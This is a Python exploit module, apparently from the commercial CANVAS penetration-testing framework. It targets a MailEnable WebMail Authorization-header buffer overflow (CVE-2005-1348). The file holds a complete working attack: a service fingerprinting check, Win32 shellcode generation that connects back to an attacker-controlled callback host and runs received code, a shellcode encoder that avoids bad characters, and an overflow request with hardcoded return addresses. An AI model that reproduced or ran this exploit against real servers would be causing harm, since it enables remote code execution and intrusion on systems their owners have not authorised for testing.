#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
sys.path.append(".")
sys.path.append("../../")

from exploitutils import *
from tcpexploit import tcpexploit

VERSION="1.0"

CHANGES="""

"""

notes="""
"""

#TODO:...
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="MailEnable"
DOCUMENTATION["Date public"]="Apr 24 2005"
DOCUMENTATION["CERT Advisory"]="N/A"
DOCUMENTATION["CVE Name"] = "CVE-2005-1348"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1348"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["References"]="Found by CorryL of www.x0n3-h4ck.org"
DOCUMENTATION["Repeatability"]="This is a repeatable exploit given that the node is terminated with ExitThread."

NAME="MailEnable WebMail Authorization Buffer Overflow"
DESCRIPTION="MailEnable WebMail Authorization Buffer Overflow"

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.setPort(8080)
        self.setHost("")
        self.ssl=0
        self.setVersion(1)
        self.badstring="\x00\\/.:?\r\n%?,;\"=&+ "
        self.shelloffset=0
        self.returnoffset=0
        self.attacklen=1000
        self.setVersions()
        self.version=0
        self.listenerArgsDict["fromcreatethread"] = 1
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        #name, addie, delta
        self.versions = {
            0: ["Autoversion N/A", 0, 0],
            1: ["MailEnable Enterprise <= 1.04", 0x7c5ca004, 0x104]
        }
                
    def createShellcode(self):
        from shellcode import shellcodeGenerator
        localhost=self.callback.ip
        localport=self.callback.port
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": 0x1000 })
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread", None)

        self.shellcode = sc.get()
        from encoder import chunkedaddencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return 1
        
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        s = self.gettcpsock()
        try:
            self.log("Testing for MailEnable webmail service at %s:%d"%(self.host,self.port))
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return 0
        
        teststring= "GET / HTTP/1.1\r\n"
        teststring+="Host: localhost\r\n"
        teststring+="User-Agent: Mozilla\r\n"
        teststring+="Content-length: 0\r\n"
        teststring+="Connection: close\r\n"
        teststring+="\r\n"
        
        s.send(teststring)
        data=s.recv(50000)
        self.log("Test for MailEnable Returned: %s"%data)

        if data.find("MailEnable-HTTP") != -1:
            self.setVersion(1)
            return 1

        return 0
    
    def setSSL(self,ssl):
        self.ssl=ssl
        return

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        self.setProgress(25)
        
        if self.version==0:
            if self.test()==0:
                self.log("Not continuing since test failed to set version")
                return 0
            else:
                self.createShellcode()        
        self.setProgress(50)
        #first make socket connection to target port
        s=self.gettcpsock()
        s.set_timeout(50)
        self.log("Running against %s:%d"%(self.host,self.port))
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return 0
        self.setProgress(75)
        sploitstring=self.makesploit()
        self.websend(s,sploitstring)
        data=self.webrecv(s)
        self.log("Received: %s"%data)
        
        import time
        time.sleep(4)
        self.setProgress(100)
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            return 1
        
        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
        self.log("%s done (failed)"%self.name)
        return 0
        
        return 0
    
    #returns the sploitstring
    def makesploit(self):
        import struct
        name, addie, delta = self.versions[self.version]
                
        buf = ""
        buf += "GET / HTTP/1.0\r\n"
        buf += "Authorization: " + "\x41"*delta + struct.pack("<L", addie) + struct.pack("<L", addie + 0xa00) + struct.pack("<L", (addie - 0x10b0)) + "\x42"*30 + self.shellcode + "\r\n\r\n"
        return buf
          
if __name__ == '__main__':
        print "Running CANVAS "+NAME+" version "+VERSION
        app = theexploit()
        ret = standard_callback_commandline(app)
    
